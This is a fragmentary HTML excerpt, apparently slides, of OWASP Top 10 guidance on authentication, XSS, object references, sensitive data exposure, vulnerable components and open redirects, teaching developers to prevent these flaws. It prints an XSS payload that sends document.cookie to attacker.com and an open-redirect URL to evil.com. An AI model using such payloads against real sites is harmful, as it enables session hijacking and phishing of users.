            <ol>

              <li> “White list” input validation with appropriate canonicalization.</li>

              <ol>
                <li> Are credentials always protected when stored using hashing or encryption? See A6.

                <li> Are session IDs exposed in the URL (e.g., URL rewriting)?

                <li> Are session IDs vulnerable to <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Session_fixation">session fixation</a> attacks?

              <ol>
                <li> <b>A single set of strong authentication and session management controls.</b> Such controls should strive to:

                    </li>
                    <li> have a simple interface for developers. Consider the <a rel="nofollow" class="external text" href="http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Authenticator.html">ESAPI Authenticator and User APIs</a> as good examples to emulate, use, or build upon.

              <p>How Do I Prevent XSS?
                Preventing XSS requires keeping untrusted data separate from active browser content.
              </p>
              <ol>
                <li> Escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into.
                </li>
                <li> Positive or “whitelist” input validation.
                </li>
                <li> For rich content, consider auto-sanitization libraries like OWASP's <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/AntiSamy" title="AntiSamy" class="mw-redirect">AntiSamy</a> or the <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project" title="OWASP Java HTML Sanitizer Project"> Java HTML Sanitizer Project</a>.

              <h2>Example Scenarios</h2>
              <p>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
              </p>
              <pre>
                <code data-trim contenteditable>
                  (String) page += "&lt;input name='creditcard' type='TEXT'"
                  + "value='" + request.getParameter("CC") + "'&gt;";
                </code>
              </pre>
              <p>The attacker modifies the 'CC' parameter in their browser to:
              </p>
              <pre>
                <code data-trim contenteditable>
                  '&gt;&lt;script&gt;document.location='<a rel="nofollow" class="external free" <br>
                  href="http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie">http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</a>&lt;/script&gt;'
                </code>
              </pre>
              <p>This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
                Note that attackers can also use XSS to defeat any  automated CSRF defense the application might employ. See A8 for info on CSRF.
                Detection of most XSS flaws is fairly easy via testing or code analysis.

              <p>Select an approach for protecting each user accessible object (e.g., object number, filename):
              </p>
              <ol>
                <li> Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/ESAPI">ESAPI</a> includes both sequential and random access reference maps that developers can use to eliminate direct object references.
                </li>
                <li> Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.

External attackers have difficulty detecting most of these types of flaws due to limited access and they are also usually hard to exploit.

              <h2>Example Scenarios</h2>
              <p>
                <u>Scenario #1:</u> An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.
              </p>
              <p>
                <u>Scenario #2:</u> A site simply doesn't use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing all their private data.
              </p>
              <p>
                <u>Scenario #3:</u> The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All the unsalted hashes can be exposed with a rainbow table of precalculated hashes.

              <h2>Am I Vulnerable To 'Using Components with Known Vulnerabilities'?</h2>
              <p>In theory, it ought to be easy to figure out if you are currently using any vulnerable components or libraries. Unfortunately, vulnerability reports do not always specify exactly which versions of a component are vulnerable in a standard, searchable way. Further, not all libraries use an understandable version numbering system. Worst of all, not all vulnerabilities are reported to a central clearinghouse that is easy to search, although sites like CVE and NVD are becoming easier to search.
              </p>
              <p>Determining if you are vulnerable requires searching these databases, as well as keeping abreast of project mailing lists and announcements for anything that might be a vulnerability. If one of your components does have a vulnerability, you should carefully evaluate whether you are actually vulnerable by checking to see if your code uses the part of the component with the vulnerability and whether the flaw could result in an impact you care about.

              <h2>How Do I prevent 'Using Components with Known Vulnerabilities'?</h2>
              <p>One option is not to use components that you didn’t write. But realistically, the best way to deal with this risk is to ensure that you keep your components up-to-date.
                Many open source projects (and other component sources) do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version.
                Software projects should have a process in place to:
              </p>
              <ol>
                <li> Identify the components and their versions you are using, including all dependencies. (e.g., the versions plugin).
                </li>
                <li> Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up-to-date.
                </li>
                <li> Establish security policies governing component use, such as requiring certain software development practices, passing security tests, and acceptable licenses.
                </li>
              </ol>
            </div>

            <div class="squeeze">
              <h2>Example Scenarios</h2>
              <p>The following two vulnerable components were downloaded 22m times in 2011.
              </p>
              <ul>
                <li> <a rel="nofollow" class="external text" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3451">Apache CXF Authentication Bypass</a> – By failing to provide an identity token, attackers could invoke any web service with full permission.
                </li>
                <li> <a rel="nofollow" class="external text" href="http://www.infosecurity-magazine.com/view/30282/remote-code-vulnerability-in-spring-framework-for-java/">Spring Remote Code Execution</a>– Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.
                </li>
              </ul>
              <br><br>
              <p>Every application using either of these vulnerable libraries is vulnerable to attack as both of these components are directly accessible by application users. Other vulnerable libraries, used deeper in an application, may be harder to exploit.

              <ol>
                <li> Review the code for all uses of redirect or forward (called a transfer in .NET). For each use, identify if the target URL is included in any parameter values. If so, verify the parameter(s) are validated to contain only an allowed destination, or element of a destination.
                </li>
                <li> Also, spider the site to see if it generates any redirects (HTTP response codes 300-307, typically 302). Look at the parameters supplied prior to the redirect to see if they appear to be a target URL or a piece of such a URL. If so, change the URL target and observe whether the site redirects to the new target.
                </li>
                <li> If code is unavailable, check all parameters to see if they look like part of a redirect or forward URL destination and test those that do.
                </li>

              <h2>How Do I prevent 'Unvalidated Redirects and Forwards'?</h2>
              <p>Safe use of redirects and forwards can be done in a number of ways:
              </p>
              <ol>
                <li> Don’t involve user parameters in calculating the destination.
                </li>
                <li> If destination parameters can’t be avoided, ensure that the supplied value is valid, and authorized for the user.<br>
                  - It is recommended that any such destination parameters be a <b>mapping value</b>, rather than the actual URL or portion of the URL, and that server side code translate this mapping to the target URL.<br>
                  - Applications can use ESAPI to override the sendRedirect() method to make sure all redirect destinations are safe.
                </li>
              </ol>
              <br><br>
              <p>Avoiding such flaws is extremely important as they are a favorite target of phishers trying to gain the user’s trust.

              <h2>Example Scenarios</h2>
              <p>
                <u>Scenario #1:</u> The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.
              </p>
              <pre>
                <code>
                  http://www.example.com/redirect.jsp?url=evil.com
                </code>
              </pre>
              <p>
                <u>Scenario #2:</u> The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application’s access control check and then forwards the attacker to an administrative function that she would not normally be able to access.
